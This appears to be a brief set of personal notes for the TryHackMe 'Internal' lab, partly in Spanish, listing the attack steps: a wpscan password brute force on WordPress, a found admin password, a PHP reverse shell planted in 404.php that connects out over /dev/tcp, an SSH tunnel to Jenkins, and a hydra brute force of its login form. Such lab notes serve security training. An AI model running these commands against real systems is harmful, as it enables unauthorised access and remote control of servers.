# Internal - TryHackMe

##  WordPress (admin/my2boys)

```bash
wpscan --url http://10.10.137.140/blog -U admin -P /usr/share/wordlists/rockyou.txt
Reverse Shell en 404.php:

  ```

```bash
php

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"); ?>
  ```

## Acceso a Jenkins
```bash

ssh -L 9999:127.0.0.1:8080 aubreanna@10.10.137.140
  ```
## Fuerza bruta con Hydra:

```bash
hydra -l admin -P rockyou.txt 127.0.0.1 -s 9999 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid"
  ```

```bash

su root
  ```